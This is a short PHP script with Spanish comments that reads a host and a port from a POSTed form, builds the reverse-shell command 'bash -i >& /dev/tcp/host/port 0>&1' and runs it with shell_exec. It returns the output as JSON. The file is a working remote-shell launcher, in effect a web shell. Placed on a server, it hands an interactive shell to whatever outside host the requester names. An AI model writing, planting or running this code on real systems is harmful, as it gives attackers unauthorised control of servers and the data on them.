<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtén los valores de los campos del formulario
    $primercampo = $_POST['primercampo'];
    $segundocampo = $_POST['segundocampo'];

    // Verifica si se han proporcionado valores para los campos
    if (!empty($primercampo) && !empty($segundocampo)) {
        // Construye el comando Bash con los valores proporcionados
        $comandoBash = "bash -i >& /dev/tcp/$primercampo/$segundocampo 0>&1";

        // Ejecuta el comando Bash
        $output = shell_exec($comandoBash);

        // Devuelve la salida del script como respuesta JSON
        header('Content-Type: application/json');
        echo json_encode(['output' => $output]);
    } else {
        echo "Error: Debes proporcionar valores para ambos campos.";
    }
} else {
    // Redirecciona si se intenta acceder directamente a este archivo
    header('Location: index.html');
    exit();
}
?>
